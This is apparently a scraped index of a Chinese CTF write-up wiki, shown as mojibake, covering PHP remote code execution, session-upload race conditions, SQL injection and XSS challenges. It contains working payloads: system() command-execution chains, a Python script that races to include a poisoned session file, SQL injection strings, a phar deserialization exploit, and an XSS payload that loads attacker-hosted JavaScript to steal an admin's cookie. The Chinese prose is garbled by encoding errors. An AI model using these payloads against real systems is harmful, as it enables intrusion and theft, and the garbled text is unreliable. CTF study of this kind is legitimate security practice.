çš„ç›®çš„æ˜¯å°è¯•æ‰§è¡Œget_defined_vars()è¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ä½œä¸ºPHPä»£ç ã€‚1=;system(tac%20flag.php);ï¼šè¿™æ˜¯GETè¯·æ±‚çš„å¦ä¸€éƒ¨åˆ†ï¼Œå°è¯•é€šè¿‡URLå‚æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚system()ï¼šè¿™ä¸ªå‡½æ•°æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ï¼Œå¹¶å°†å®Œæ•´çš„è¾“å‡ºè¿”å›ã€‚tac%20flag.phpï¼šè¿™é‡Œçš„å‘½ä»¤æ˜¯tac flag.phpï¼Œtacæ˜¯åå‘è¾“å‡ºæ–‡ä»¶å†…å®¹çš„Unixå‘½ä»¤ï¼Œ%20æ˜¯URLç¼–ç çš„ç©ºæ ¼ã€‚è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å°è¯•æ‰§è¡Œflag.phpæ–‡ä»¶çš„åå‘å†…å®¹ã€‚ payload3é¢˜è§£ï¼ŒæŸ¥çœ‹å½“å‰å·¥ä½œç›®å½•getcwd()ï¼Œæ‰«æå½“å‰ç›®å½•åŠæ–‡ä»¶scandir()è¾“å‡º ä¸ºæ•°ç»„ï¼Œflag.php åœ¨å€’æ•°ç¬¬äºŒä¸ªä¸ªä½ç½®é‚£å°±æ•°ç»„å€’ç½®array_revers()ï¼Œå˜ä¸ºæ­£æ•°ç¬¬äºŒï¼Œåœ¨ä½¿ç”¨next()å‡½æ•°æŒ‡å‘ä»ç¬¬ä¸€ä¸ªæŒ‡å‘ç¬¬äºŒä¸ªï¼ˆåŠæŒ‡å‘flag.phpï¼‰,æœ€åä½¿ç”¨show_sourceï¼ˆï¼‰æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));url+?c=print_r(getcwd()); === /var/www/htmlurl+?c=print_r(scandir(getcwd())); === Array ( [0] = . [1] = .. [2] = flag.php [3] = index.php )url+?c=print_r(array_reverse(scandir(getcwd()))); == Array ( [0] = index.php [1] = flag.php [2] = .. [3] = . )url+?c=print_r(next(array_reverse(scandir(getcwd())))); == flag.phpurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); == $flag=ctfshoweca2e7df-d196-4b71-9632-ad4d32e194d3; è¯»å–ç›®å½•getallheaders()ï¼šè¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯æ•°ç»„â½½evalè¦æ±‚ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦â½¤implode()å‡½æ•°å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²get_defined_vars()ï¼šè¯¥å‡½æ•°çš„ä½œâ½¤æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¸è¿‡æ˜¯â¼†ç»´æ•°ç»„ï¼Œâ½¤var_dump()è¾“å‡ºå¯ä»¥çœ‹â»…è¾“å‡ºçš„å†…å®¹ï¼Œçœ‹â»…åœ¨ç¬¬â¼ä½ä¹‹åï¼Œå¯ä»¥â½¤current()å‡½æ•°æ¥è·å–å…¶å€¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹å®˜â½…å‡½æ•°ã€‚payloadï¼švar_dump(current(get_defined_vars()));session_id()ï¼šsession_id()å¯ä»¥â½¤æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œå¯ä»¥â½¤è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚ å¦‚å¯ä»¥åœ¨cookieä¸­è®¾ç½® PHPSESSID=706870696e666f28293bï¼Œç„¶åâ½¤hex2bin()å‡½æ•°ï¼Œå³ä¼ â¼Š?exp=eval(hex2bin(session_id(session_start()))); å¹¶è®¾ç½®cookieï¼šPHPSESSID=706870696e666f28293b session_start å‡½æ•°æ˜¯ä¸ºäº†å¼€å¯sessioné…åˆä½¿â½¤çš„å‡½æ•°ï¼šprint_r(scandir(â€˜.â€™)); æŸ¥çœ‹å½“å‰â½¬å½•ä¸‹çš„æ‰€æœ‰â½‚ä»¶å var_dump()localeconv() å‡½æ•°è¿”å›â¼€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬â¼€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«åeach() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€æ­¥end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åâ¼€ä¸ªå•å…ƒnext() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€ä½prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›â¼€ä½array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„"},{"title":"session","path":"/wiki/WP/session/session.html","content":"é¢˜ç›®if(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); $file = str_replace(., ???, $file); include($file);else highlight_file(__FILE__); ç›¸å…³çŸ¥è¯†åœ¨php5.4ä¹‹åphp.iniå¼€å§‹æœ‰â¼ä¸ªé»˜è®¤é€‰é¡¹ 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = â€œupload_progress_â€ 4.session.upload_progress.name = â€œPHP_SESSION_UPLOAD_PROGRESSâ€ 5.session.use_strict_mode=off ç¬¬â¼€ä¸ªè¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ â¼€ä¸ªâ½‚ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡â½‚ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ç¬¬â¼†ä¸ªè¡¨ç¤ºå½“â½‚ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šâ½´å³æ¸…ç©ºå¯¹åº”sessionâ½‚ä»¶ä¸­çš„å†…å®¹ ç¬¬ä¸‰å’Œç¬¬å››ä¸ªprefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å ç¬¬äº”ä¸ªè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­sessionIDå¯æ§ç®€â½½â¾”ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©â½¤session.upload_progresså°†â½Šâ»¢å†™â¼Šsessionâ½‚ä»¶ï¼Œç„¶ååŒ…å«è¿™ä¸ªsessionâ½‚ä»¶ã€‚ä¸è¿‡å‰ææ˜¯æˆ‘ä»¬éœ€è¦åˆ›å»ºâ¼€ä¸ªsessionâ½‚ä»¶ï¼Œå¹¶ä¸”çŸ¥é“sessionâ½‚ä»¶çš„å­˜æ”¾ä½ç½®ã€‚å› ä¸ºsession.use_strict_mode=offçš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥â¾ƒå®šä¹‰sessionIDlinuxç³»ç»Ÿä¸­sessionâ½‚ä»¶â¼€èˆ¬çš„é»˜è®¤å­˜å‚¨ä½ç½®ä¸º /tmp æˆ– /var/lib/php/sessionä¾‹å¦‚æˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®äº†PHPSESSID=flagï¼Œphpä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºâ½‚ä»¶ï¼š/tmp/sess_flagï¼Œå³ä½¿æ­¤æ—¶â½¤æˆ·æ²¡æœ‰åˆå§‹åŒ–sessionï¼Œphpä¹Ÿä¼šâ¾ƒåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§â½£â¼€ä¸ªé”®å€¼ï¼Œä¸ºprefix+nameçš„å€¼ï¼Œæœ€åè¢«å†™â¼Šsess_â½‚ä»¶â¾¥è¿˜æœ‰â¼€ä¸ªå…³é”®ç‚¹å°±æ˜¯session.upload_progress.cleanupé»˜è®¤æ˜¯å¼€å¯çš„ï¼Œåªè¦è¯»å–äº†postæ•°æ®ï¼Œå°±ä¼šæ¸…é™¤è¿›åº¦ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©â½¤æ¡ä»¶ç«äº‰æ¥passï¼Œå†™â¼€ä¸ªè„šæœ¬æ¥å®Œæˆ import ioimport requestsimport threadingurl = http://a914fd90-ab5f-44ae-a9a7-20fb9b6d991e.challenge.ctf.show/def write(session): data = PHP_SESSION_UPLOAD_PROGRESS: ?php system(tac f*);?mumuzi while True: f = io.BytesIO(ba * 1024 * 10) response = session.post(url,cookies=PHPSESSID: flag, data=data, files=file: (muzi.txt, f))def read(session): while True: response = session.get(url+?file=/tmp/sess_flag) if mumuzi in response.text: print(response.text) break else: print(retry)if __name__ == __main__: session = requests.session() write = threading.Thread(target=write, args=(session,)) write.daemon = True write.start() read(session)"},{"title":"æ‚é¡¹çŸ¥è¯†ç‚¹","path":"/wiki/WP/sqlæ³¨å…¥/æ‚é¡¹çŸ¥è¯†ç‚¹.html","content":"åˆ†ç±»1. MD5æ³¨å…¥ md5($password,true) md5(string,raw) å‚æ•° æè¿°string\tå¿…éœ€ã€‚è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚ raw å¯é€‰ã€‚é»˜è®¤ä¸å†™ä¸ºFALSEã€‚32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²TRUEã€‚16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸² ffifdyopå­—ç¬¦ä¸²ä¼šé€ æˆæ¼æ´ã€‚md5(ffifdyop,true)=â€™orâ€™6xxxxxxå› æ­¤ä¼ å…¥ffifdyopä¹‹åï¼Œæ•°æ®åº“æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼šselect * from â€˜adminâ€™ where password= or â€™6xxxxxx â€™ ï¼Œå˜æˆ â€˜â€™ or 6 MD5è¿”å›çš„16è¿›åˆ¶æ•°æ—¶ å‡ºç°ä¸ç¬¦åˆæ ‡å‡†æ ¼å¼çš„åå…­è¿›åˆ¶æ•°ã€ä¸ç¬¦åˆé¢„æœŸçš„é•¿åº¦ã€åŒ…å«ç‰¹æ®Šæƒ…å†µæˆ–é”™è¯¯ç­‰æƒ…å†µä¸‹ï¼Œä¼šè¿”å›äºŒè¿›åˆ¶æ•°ï¼Œç»æµè§ˆå™¨ç¼–ç æƒ…å†µä¸‹ï¼Œä¼šå˜æˆå¥‡æ€ªçš„å­—ç¬¦ï¼Œç»è¿‡ä¸æ–­å°è¯•åï¼Œå‘ç°æŸäº›ç‰¹å®šå­—ç¬¦è¢«mysqlè§£ææˆä¸‡èƒ½å¯†ç çš„æ ¼å¼ã€å¦‚129581926211651571912466741651878684928ã€ffifdyopï¼Œä½†è¿™é‡Œä¸èƒ½ç”¨æ•°å­—å‹ï¼Œå› ä¸ºé™åˆ¶å¯†ç é•¿åº¦äº†åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚ 2.with rollupusername=admin//or//1=1//group//by//password//with/**/rollup#password= åŠ å…¥with rollupå passwordæœ‰ä¸€è¡Œä¸ºNULLï¼Œæˆ‘ä»¬åªè¦è¾“å…¥ç©ºå¯†ç ä½¿å¾—ï¼ˆNULL==NULLï¼‰å³å¯æ»¡è¶³$password==$row[password]çš„é™åˆ¶æˆåŠŸç™»é™†with rollup æ˜¯å¯¹åˆ†ç»„åçš„ç»“æœè¿›è¡Œèšåˆæ±‚å’Œï¼Œåœ¨æœ€åä¸€è¡Œç”Ÿæˆæ±‚å’Œçš„æ•°æ®ã€‚ä½†æ˜¯å¦‚æœå½“å‰åˆ—æ˜¯å­—ç¬¦ä¸²æ— æ³•æ±‚å’Œçš„è¯ï¼Œæ±‚å’Œç»“æœå°±ä¼šå˜æˆNULL 3.è¿‡æ»¤äº† information_schema.tables å’Œinformation_schema.columnsæ–¹æ³•ä¸€ï¼šåå¼•å·ç»•è¿‡ information_schema.`tables` å’Œ information_schema.`columns` æ–¹æ³•äºŒï¼šæ‰¾å¹³æ›¿è¡¨+æ— åˆ—åæŸ¥è¯¢ æ¯”å¦‚ysql.innodb_table_stats (ç”±äºmysqlç‰ˆæœ¬ä¸åŒï¼Œå¯åˆ©ç”¨çš„è¡¨ä¹Ÿä¸ä¸€æ ·) select * from users as a join users as b; ä¼šå‡ºç°aè¡¨å’Œbè¡¨æ‹¼æ¥æˆä¸€ä¸ªæ–°è¡¨ å†å¯¹å…¶ä½¿ç”¨ä¸€ä¸ªselectæŸ¥è¯¢è¿›è¡ŒåŒ…è£¹ï¼Œç”±äºä¼šå‡ºç°å¤šä¸ªç›¸åŒçš„åˆ—åï¼Œé‚£ä¹ˆä»–å°±ä¼šæŠ¥é”™ã€‚å°±å¯ä»¥åˆ©ç”¨æ­¤ç‰¹æ€§è¿›è¡Œsqlæ³¨å…¥æŸ¥è¯¢åˆ—åã€‚ select * from (select * from users as a join users as b) as c; å½“æŸ¥è¯¢å®Œç¬¬ä¸€ä¸ªåˆ—åæ—¶ï¼Œä½¿ç”¨usingæ’é™¤ï¼Œç»§ç»­æŸ¥è¯¢ä¸‹ä¸€ä¸ªåˆ—åã€‚ select * from (select * from users as a join users as b using(id)) as c;å®æ“ï¼š ?id=0 union select * from (select * from users as a join users as b) as c --+ ï¼ˆä¼šæ˜¾ç¤ºå‡ºidï¼‰ ?id=0 union select * from (select * from users as a join users as b using(id)) as c --+ ï¼ˆä¼šæ˜¾ç¤ºå‡ºusernameï¼‰ ?id=0 union select * from (select * from users as a join users as b using(idï¼Œusername)) as c --+(ä¼šæ˜¾ç¤ºå‡ºç¬¬ä¸‰åˆ—ï¼Œä»¥æ­¤ç±»æ¨)"},{"title":"è·å–ç›®å½•","path":"/wiki/WP/REC/è·å–ç›®å½•.html","content":"å‡½æ•°"},{"title":"XSS--Server Side(æœåŠ¡ç«¯)","path":"/wiki/WP/root-me/XSS--Server Side(æœåŠ¡ç«¯).html","content":"https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Sideè¿›é¡µé¢ä¹‹åï¼Œå‘ç°å¯ä»¥ç”Ÿæˆä¿¡æ¯ï¼Œé¡µé¢å¾ˆç†Ÿæ‚‰ï¼Œæƒ³åˆ°å¯ä»¥è¯•è¯•å­˜å‚¨å‹sxx å‘ç°ï¼Œæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œéƒ½ä¼šè¿”å› çœ‹åˆ°ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œè¯•è¯•ï¼Œæ³¨å†Œé¡µé¢æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æ³¨å†Œä¹‹åï¼Œç™»å½•ï¼Œçœ‹æœ‰æ²¡æœ‰ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„(åå°„å‹xssç‰¹ç‚¹ï¼Œæ‰¾é¡µé¢å›æ˜¾çš„)ï¼Œ è¯´æ˜first name å’Œlast name ä¼šå›æ˜¾ ç”Ÿæˆè¯ä¹¦ è¯´æ˜å¯ä»¥ä»first name å’Œlast nameå…¥æ‰‹æ„é€ xss ç„¶åæ„é€ payload scriptdocument.write(iframe src=file:///flag.txt/iframe);/script è·å–flag"},{"title":"è¯»å–æ–‡ä»¶","path":"/wiki/WP/REC/è¯»å–æ–‡ä»¶.html","content":"å‡½æ•°highlight_file($filename);show_source($filename);require($filename)print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,r), $size);include($filename); // â¾®phpä»£ç include_once($filename); // â¾®phpä»£ç require($filename); // â¾®phpä»£ç require_once($filename); // â¾®phpä»£ç print_r(fread(popen(cat flag, r), $size));print_r(fgets(fopen($filename, r))); // è¯»å–â¼€â¾fpassthru(fopen($filename, r)); // ä»å½“å‰ä½ç½®â¼€ç›´è¯»å–åˆ° EOFprint_r(fgetcsv(fopen($filename,r), $size));print_r(fgetss(fopen($filename, r))); // ä»â½‚ä»¶æŒ‡é’ˆä¸­è¯»å–â¼€â¾å¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°print_r(fscanf(fopen(flag, r),%s));print_r(parse_ini_file($filename)); // å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„print_r(glob(*)); // åˆ—å½“å‰â½¬å½•print_r(glob(/*)); // åˆ—æ ¹â½¬å½•print_r(scandir(.));print_r(scandir(/));$d=opendir(.);while(false!==($f=readdir($d)))echo$f ;$d=dir(.);while(false!==($f=$d-read()))echo$f. ;$a=glob(/*);foreach($a as $value)echo $value. ;$a=new DirectoryIterator(glob:///*);foreach($a as $f)echo($f-__toString(). );"},{"title":"XSS - Reflected(åå°„å‹)","path":"/wiki/WP/root-me/XSS - Reflected(åå°„å‹).html","content":"ç›´æ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ å‘ç°æœ‰ä¸ª?ppricesï¼Œå°è¯•æœ‰æ²¡æœ‰æ³¨å…¥ç‚¹ æŠ¥404ï¼Œæ£€æŸ¥ä¸€æ³¢ï¼Œ å‘ç°åœ¨é“¾æ¥å†…ï¼Œå¯ä»¥æ„é€ ä¸€ä¸‹ ç»“æœæ²¡ååº”ï¼Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤æ‰äº† å‘ç°onmousemove å’Œâ€™ å¯ä»¥ç”¨ ä½†é¢˜ç›®è¦æ±‚æ˜¯admin ä¸ä¼šç‚¹å‡»æ‰€æœ‰å¯ç–‘çš„ XSS é“¾æ¥ ï¼Œå°è¯•æœ¬åœ°æ„é€ éšå½¢åŒ–xss,å‘æœåŠ¡å™¨å‘é€cookieï¼Œ æœåŠ¡å™¨åˆ©ç”¨è“è²èŠ±xsså¹³å°æ„å»ºhttps://github.com/firesunCN/BlueLotus_XSSReceiver ç”Ÿæˆæœ¬åœ°js,æ„å»ºpayload å‘ç°è¢«è¿‡æ»¤æ‰äº†,æ¢ç§æ–¹å¼ ?pexp%27%20onmouseover%27(function(){var%20sdocument.createElement(%22script%22);s.src%22http://your-ip/myjs/test.js%22;document.head.appendChild(s)})()%27 ç»™ç®¡ç†å‘˜æäº¤ä½ çš„æŠ¥å‘Šï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå°±ä¼šè¿”å›å†…å®¹ï¼Œä»–ä¼šå‘é€å¾ˆå¤šæ¬¡ï¼Œæœ‰æ—¶å€™æ²¡å‘è¿‡æ¥ï¼Œå¾—å¤šæ‰¾ä¸€ä¸‹"},{"title":"pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡","path":"/wiki/WP/æ–‡ä»¶ä¸Šä¼ /pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡.html","content":"ä»€ä¹ˆæ˜¯phar JARæ˜¯å¼€å‘javaç¨‹åºä¸€ä¸ªåº”ç”¨ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„å¯æ‰§è¡Œã€å¯è®¿é—®çš„æ–‡ä»¶éƒ½æ‰“åŒ…è¿›äº†ä¸€ä¸ªJARæ–‡ä»¶é‡Œï¼Œä½¿å¾—éƒ¨ç½²è¿‡ç¨‹ååˆ†ç®€å•ã€‚pharæ˜¯phpé‡Œç±»ä¼¼ä¸JARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚å¯¹äºPHP5.3æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œå¯ä»¥ä½¿ç”¨å®ƒã€‚ Pharç»“æ„ stub:pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œå¿…é¡»ä»¥ xxx __HALT_COMPILER();? ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¯†åˆ«ã€‚xxxå¯ä»¥ä¸ºè‡ªå®šä¹‰å†…å®¹ã€‚ manifest:pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚ content:è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ signature (å¯ç©º):ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚ æ³¨æ„ï¼šPharåè®®è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹manifestå­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ– pharæ–‡ä»¶ä¸Šä¼ ç»•è¿‡çš„æœ¬è´¨å°±æ˜¯pharååºåˆ—åŒ–ï¼Œåªä¸è¿‡æ˜¯éœ€è¦æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè¿™ä¸ªæ¡ä»¶æ˜¯éå¸¸è‹›åˆ»çš„ï¼Œè¦å¯¹æ–¹å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«å¹¶ä¸”æ”¯æŒpharä¼ªåè®®ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ ç›´æ¥çœ‹é¢˜å§ ?phphighlight_file(__FILE__);error_reporting(0);class TestObject public function __destruct() include(flag.php); echo $flag; #å¤§è‡´æ„æ€å°±æ˜¯æˆ‘ä»¬è¦ååºåˆ—åŒ–è§¦å‘__destruct()æ–¹æ³•ï¼Œå°±ä¼šè¾“å‡ºflag$filename = $_POST[file];if (isset($filename)) echo md5_file($filename);//postæ¥å—ä¸€ä¸ªæ–‡ä»¶åï¼Œå¦‚æœå­˜åœ¨ä¼šè¿”å›æ–‡ä»¶çš„md5å€¼//upload.php æ–‡ä»¶ä¸Šä¼ é¡µé¢? æˆ‘è¿™é‡Œä¸å¯¹ä»£ç è¿›è¡Œè¿‡å¤šçš„è®²è§£äº†ï¼Œçœ‹æ³¨é‡Šã€‚ è§£é¢˜æ­¥éª¤ï¼š1.ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶â€“2.åœ¨mate-dataé‡Œæ”¾ç½®ä¸€ä¸ªåŒ…å«TestObject()çš„åºåˆ—å·å­—ç¬¦ä¸²â€“3.ä¸Šä¼ æ–‡ä»¶â€“4.md5_fileæ‰§è¡Œpharä¼ªåè®®ï¼Œè§¦å‘ååºåˆ—åŒ–â€“5.ååºåˆ—åŒ–TestObject()è§¦å‘__destruckæ‰§è¡Œecho $flag ç”Ÿæˆpharæ–‡ä»¶ ?phpclass TestObject@unlink(test.phar); //åˆ é™¤ä¹‹å‰çš„test.paræ–‡ä»¶(å¦‚æœæœ‰)$phar=new Phar(test.phar); //åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€$phar-startBuffering(); //å¼€å§‹å†™æ–‡ä»¶$phar-setStub(?php __HALT_COMPILER(); ?); //å†™å…¥stub$o=new TestObject();$phar-setMetadata($o);//å†™å…¥meta-data$phar-addFromString(test.txt,test); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-stopBuffering();? æˆ‘ç”Ÿæˆpharçš„ç¯å¢ƒä½¿ç”¨çš„æ˜¯ è¦åœ¨php.iniä¸­ä¿®æ”¹åœ¨è¿™ä¸ª ç„¶åè®¿é—®æ–‡ä»¶ï¼Œç”ŸæˆpharåŒ…ï¼Œç”±äºæœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œç™½åå•è¿‡æ»¤ï¼Œæ‰€æœ‰ä¿®æ”¹æ–‡ä»¶åç¼€ä¼ªjpg ä¸Šä¼ æ–‡ä»¶ åŒ…å«æ–‡ä»¶ï¼Œè¯»å–flag"},{"title":"ç»•è¿‡select,å †å ","path":"/wiki/WP/sqlæ³¨å…¥/ç»•è¿‡select,å †å .html","content":"2019å¼ºç½‘æ¯â€éšä¾¿æ³¨â€ä¸€çœ‹å°±æ˜¯sqlæ³¨å…¥é¦–å…ˆåˆ¤æ–­æ˜¯æ•°å­—è¿˜æ˜¯å­—ç¬¦æ³¨å…¥ï¼Œ è¾“å…¥ 1 ï¼Œ2ï¼Œååº”æ­£å¸¸ï¼Œ è¾“å…¥2-1 ï¼Œç»“æœå›æ˜¾2 çš„å†…å®¹ï¼Œæ’é™¤æ•°å­—æ³¨å…¥ è¾“å…¥1â€™ æŠ¥é”™ï¼Œé‚£å°±æ˜¯ select * from database Â·Â·Â·Â·Â·idâ€™1â€™; ç„¶åå°±æ˜¯çœ‹åˆ—æ•°ï¼› 1â€™ order by 2 â€“+ å›æ˜¾æ­£å¸¸ï¼Œ order by 3â€“+å¼‚å¸¸ï¼Œé‚£å°±æ˜¯ä¸¤åˆ— ç„¶åæ­£å¸¸çš„æ³¨å…¥ 1â€™ union select 1,2 â€“+,å‘ç° preg_match(â€œselect|update|delete|drop|insert|where|.i select ç­‰è¢«ban äº†é€šè¿‡æŠ¥é”™æ¥æŸ¥çœ‹æ•°æ®åº“ï¼Œç­‰ä¿¡æ¯ 2â€™ and extractvalue(1,concat(0x7e,(version()),0x7e))â€“+ ç„¶åå¯ä»¥ç”¨å †å æ³¨å…¥ï¼Œæ¥æ˜¾ç¤ºå…¶ä»–ä¿¡æ¯ å†…å®¹å°±åœ¨ # supersqli å†…å®¹å°±åœ¨ 1919810931114514æ€ä¹ˆå¾—åˆ°é‡Œé¢çš„å†…å®¹å‘¢ï¼Ÿ æ–¹æ³•ä¸€ ï¼šä½¿ç”¨handlerHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚ é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚ é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚ æ–¹æ³•äºŒï¼šä½¿ç”¨é¢„å¤„ç†è¯­å¥setç”¨äºè®¾ç½®å˜é‡åå’Œå€¼prepareç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥executeæ‰§è¡Œè¯­å¥deallocate prepareç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥-1;set @sql = CONCAT(se,lect * from `1919810931114514`;);prepare stmt from @sql;EXECUTE stmt;ç»“æœä¸ºstrstr($inject, set) strstr($inject, prepare) 